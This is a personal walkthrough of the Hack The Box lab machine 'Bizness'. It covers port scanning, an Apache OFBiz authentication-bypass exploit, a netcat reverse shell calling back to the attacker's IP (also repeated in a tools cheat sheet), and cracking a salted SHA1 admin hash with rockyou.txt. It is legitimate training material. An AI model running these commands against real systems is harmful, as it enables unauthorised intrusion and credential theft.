URL: https://app.hackthebox.com/machines/Bizness

Current target IP: 10.10.11.252
`TARGET=10.10.11.252`

Started with a port scanner
* I want to scan everything from port 1 to port 1000, TCP & UDP with servce discovery using nmap
    `sudo nmap -sS -sU -p 1-10000 --version-intensity 0 $TARGET`
* It's slow as hell. So start again, just with TCP and without service discovery. Also giving a -v to see anything
    `sudo nmap -v -sS -p 1-10000 $TARGET`
* Three interesting port is found immadiatly.
```
Discovered open port 80/tcp on 10.10.11.252
Discovered open port 443/tcp on 10.10.11.252
Discovered open port 22/tcp on 10.10.11.252
```
* I will check the 80 and 443 ports with browser.
* I got that "This site can't be reached" also my browser redirected me to https://bizness.htb/.
    - DNS_PROBE_FINISHED_NXDOMAIN
    - I try it with curl: `curl -o index.html http://$TARGET/`
    - I see that it runs nginx/1.18.0 from the response
    - I want to see where is it redurected, for this I have to use the curl -i to see the headers
        - I don't know what I expected. :) https://bizness.htb/

* Checking nginx/1.18.0 
    - https://www.cybersecurity-help.cz/vdb/nginx/nginx/1.18.0/
    - remote code execution
    - PoC: https://github.com/M507/CVE-2021-23017-PoC

* To execute the PoC, I need the DNS server IP address of the target
    - `pip install scapy==2.5.0` is needed
* The POC needs root privileges, but I checked its code, it looks safe
* So I need the DNS server IP address
    - When I check the IP in the browser, it redirects me to the bizness.htb
    - `nslookup -type=ns bizness.htb` 
    - It can't find anything... I should execute it from the server. Maybe I can login with ssh. Nope. SSH needs key
* Now I feel I am on the wrong track.
    - I see that it runs a vulnerable nginx version
        - It has a high prio vul. but I should know its DNS address
    - Yep... I had to add the "10.10.11.252    bizness.htb" line to my /etc/hosts 
    - Now I can see the hosted webpage
* There is a form in the webpage and it does a bunch of client side check.
    - I see that it sends the data to contactform/contactform.php
    - The form does nothing
* Try to send a custom post message to https://bizness.htb/contactform/contactform.php
    - `curl -X POST -d "hello=world" https://bizness.htb/contactform/contactform.php`

This is where I gave up. :)

https://medium.com/@karimwalid/hack-the-box-bizness-walkthrough-3e19aab509d2


Summary:
- Directory bruteforce would give me some hint

Let's continue without the walktrough

So I executed `dirb https://bizness.htb`
Gave me some interesting results
    https://bizness.htb/accounting
    This hosts ofbiz. I have no idea about the version

    Maybe it is vulnerable to CVE-2023-51467

Here is the exploit: https://github.com/K3ysTr0K3R/CVE-2023-51467-EXPLOIT/blob/main/CVE-2023-51467.py

The right command: python CVE-2023-51467.py -u https://bizness.htb

So we found a RCE vul... Cool.

Here is the curl command:
curl -k "https://bizness.htb/webtools/control/ping?USERNAME&PASSWORD=test&requirePasswordChange=Y"

With a little google search: https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass

I had an issue with my Java version but after I fixed it, I executed a reverse shell using this command (I peeked for it. :) 

python3 exploit.py --url https://bizness.htb/ --cmd 'nc -c bash 10.10.14.188 1337'

(Before that I had to execute the nc -lp 1337)
Now I have a shell on my machine. I verified it by ls
I am ofbiz (whoami)

After that I found the user.txt at the user home dir

Now I need some privilage escalation.
With `uname -r` i got the kernel version: 5.10.0-26-amd64
(The https://www.exploit-db.com/exploits/50808 is hard to use, but not impossible)
These looks primising, too.
I peeked to the walktrough and I know that I have to find a specific file named AdminUserLoginData
To be more general, checking files with names like Admin and Root seems a good idea

I checked the walktrough and I see that the solution is to find some files and grab the hashed, salted password.
From this point the walktrough is not deep, (The author starts with the AdminUserLoginData.xml which is a dead end and we wont need it, but a derby database file will contain the salted hashed admin password)

but I've found a forum about this machine:

https://breachforums.is/Thread-Bizness-HTB?page=6

The points are the following:
- This is a password, but we have no idea if it's salted or not or anything
- Also (if I understand correctly), this is just the root password for ofbiz, but maybe it's the same as the root password or we will know more from it 

This is rom the AdminUserLoginData.xml, but I couldn't do anything about it
"{SHA}47ca69ebb4bdc9ae0adec130880165d2cc05db1a"

- To know anything about this, we have to know the ofbiz deeply. It's open source and its crypto functions are here:

https://github.com/apache/ofbiz/blob/trunk/framework/base/src/main/java/org/apache/ofbiz/base/crypto/HashCrypt.java

The comparePassword could be the entry point for us (according to its name)
It will call the doCompareTypePrefix

```[java]
    private static boolean doCompareTypePrefix(String crypted, String defaultCrypt, byte[] bytes) {
        int typeEnd = crypted.indexOf("}");
        String hashType = crypted.substring(1, typeEnd);
        String hashed = crypted.substring(typeEnd + 1);
        MessageDigest messagedigest = getMessageDigest(hashType);
        messagedigest.update(bytes);
        byte[] digestBytes = messagedigest.digest();
        char[] digestChars = Hex.encodeHex(digestBytes);
        String checkCrypted = new String(digestChars);
        if (hashed.equals(checkCrypted)) {
            return true;
        }
        // This next block should be removed when all {prefix}oldFunnyHex are fixed.
        if (hashed.equals(oldFunnyHex(digestBytes))) {
            Debug.logWarning("Warning: detected oldFunnyHex password prefixed with a hashType; this is not valid, please update the value in the database with ({%s}%s)", module, hashType, checkCrypted);
            return true;
        }
        return false;
    }
```

According to this, this is not salted, so we could reverse it with a dictionary, but I can't.

This looks like a dead and, but an other file, some derby database dat file contains an other password like string: 
(I didn't found this file, but someone on the forum linked it, it's a simple XML file with clear content)

$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2IYNN

This is different. It starts with $, so it will handled by this:

```[java]
    private static boolean doComparePosix(String crypted, String defaultCrypt, byte[] bytes) {
        int typeEnd = crypted.indexOf("$", 1);
        int saltEnd = crypted.indexOf("$", typeEnd + 1);
        String hashType = crypted.substring(1, typeEnd);
        String salt = crypted.substring(typeEnd + 1, saltEnd);
        String hashed = crypted.substring(saltEnd + 1);
        return hashed.equals(getCryptedBytes(hashType, salt, bytes));
    }
```

So the getCryptedBytes will tell us the exact alg:

```[java]

    private static String getCryptedBytes(String hashType, String salt, byte[] bytes) {
        try {
            MessageDigest messagedigest = MessageDigest.getInstance(hashType);
            messagedigest.update(salt.getBytes(UtilIO.getUtf8()));
            messagedigest.update(bytes);
            return Base64.encodeBase64URLSafeString(messagedigest.digest()).replace('+', '.');
        } catch (NoSuchAlgorithmException e) {
            throw new GeneralRuntimeException("Error while comparing password", e);
        }
    }

```

According to this, the salt (d) and the password are just concatenated and hashed.

I think I get it now. We have two different password entries with two different hashing: one with salt: 
`$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2IYNN`

And one without salt
`{SHA}47ca69ebb4bdc9ae0adec130880165d2cc05db1a`

I couldn't figure out what the hash without salt, but the salted one is a hash with processed by encodeBase64URLSafeString so we have to decode it first:
This function replaces + to - and / to _ so the decoded string is:

The SHA1 is 20 bytes long, this output is 30 bytes long, I have to check the code of Base64.encodeBase64URLSafeString

https://github.com/apache/commons-codec/blob/master/src/main/java/org/apache/commons/codec/binary/Base64.java

```[java]
    public static String encodeBase64URLSafeString(final byte[] binaryData) {
        return StringUtils.newStringUsAscii(encodeBase64(binaryData, false, true));
    }
```

(The encodeBase64 is overloaded, the maxResultSize will be Integer.MAX_VALUE)

```[java]
    public static byte[] encodeBase64(final byte[] binaryData, final boolean isChunked,
                                      final boolean urlSafe, final int maxResultSize) {
        if (BinaryCodec.isEmpty(binaryData)) {
            return binaryData;
        }

        // Create this so can use the super-class method
        // Also ensures that the same roundings are performed by the ctor and the code
        final Base64 b64 = isChunked ? new Base64(urlSafe) : new Base64(0, CHUNK_SEPARATOR, urlSafe);
        final long len = b64.getEncodedLength(binaryData);
        if (len > maxResultSize) {
            throw new IllegalArgumentException("Input array too big, the output array would be bigger (" +
                len +
                ") than the specified maximum size of " +
                maxResultSize);
        }

        return b64.encode(binaryData);
    }

```

A simplification based on the boolean flags?:

```[java]
    public static byte[] encodeBase64(final byte[] binaryData, isChunked = false, urlSafe = true) {
        if (BinaryCodec.isEmpty(binaryData)) {
            return binaryData;
        }

        // Create this so can use the super-class method
        // Also ensures that the same roundings are performed by the ctor and the code
        final Base64 b64 = new Base64(0, CHUNK_SEPARATOR, urlSafe);
        return b64.encode(binaryData);
    }

```

So this b64 encodes the bytes using a 64 element set:

```
    private static final byte[] URL_SAFE_ENCODE_TABLE = {
            'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M',
            'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
            'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm',
            'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
            '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '-', '_'
    };
```

A 20 bytes long string is 160 bits long and an element of the result will hold 6 bits, so it will 27 bytes long. I assume that some metadata is needed for the start (to add the orininal length of the byte series), so it can be the 30 bytes long string.

Yeah... This will it. So I created a python code that gives me back the original SHA1 hash:

```[java]
import base64

def decode_base64_url_safe(encoded_str):
    """
    Decode a Base64 URL-safe encoded string with padding correction.

    Args:
    encoded_str (str): The Base64 URL-safe encoded string.

    Returns:
    bytes: The decoded bytes.
    """
    # Replace URL-safe characters back to original Base64 characters
    standard_b64 = encoded_str.replace('-', '+').replace('_', '/')

    # Add padding if necessary
    padding = len(standard_b64) % 4
    if padding > 0:
        standard_b64 += "=" * (4 - padding)

    # Decode the Base64 string
    decoded_bytes = base64.b64decode(standard_b64)

    return decoded_bytes

# The encoded string
encoded_hash = "uP0_QaVBpDWFeo8-dRzDqRwXQ2IYNN"

# Decode the string
decoded_hash = decode_base64_url_safe(encoded_hash)

decoded_hash.hex()  # Return the hex representation of the decoded hash

```

And here is the result:
(the last four bytes are trash becasue of the padding, we must use the first 40 chars)
`b8fd3f41a541a435857a8f3e751cc3a91c1743621834`

So we have to find out what is the password which:

SHA1("d{password}") === `b8fd3f41a541a435857a8f3e751cc3a91c174362`

This can be solved using a dictionary method (using rockyou.txt for example) and we can find out that the password is
"monkeybizness"

This is the admin password for the ofbiz but with any luck, we can find something useful on the ofbiz admin panel OR this is the same as the root password.
In this case, we can use it as root password and can upload the flag.

## Summary


This machine had two parts:
* logging in was easy. You must know some basic tool and find an existing exploit
* becoming root was hard af (for me). You must become familiar to the source code of ofbiz and "reverse engineer" the salted hash
    - Next time I see an apache hash, I will do what to do
    - The steps I should have done:
        1) Downloading every file from the server to my machine after get the reverse shell
        2) Analize the hell out of the downloaded files (find every password related stuff)
        3) Find out what is that hashed, salted password
        4) Write a Python script for brute forcing the hash using rockyou.txt
    - Still, I needed three things:
        1) The root password was lame, it was in the rockyou.txt
        2) The root password was used for ofbiz, too

Still, it was fun even when I had to check help for it. :)

### Protecting servers
    1) Disable brute force discoveries
    2) Strong passwords
    3) Updated systems
    4) Disable outgoing ports

### Used tools
    * nmap
        - sudo nmap -v -sS -p 1-10000 $TARGET : Scan every TCP port with service discovery
    * dirb : directory bruteforce
        - dirb http://webpage.com : The webpage to bruteforce
    * rockyou.txt : A large password collection
    * nc
        - nc -lp 1337 : Listen to port 1337
        - nc -c bash 10.10.14.188 1337 : If you can execute this on the attacked machine, you will get a reverse shell. (The IP is your machine)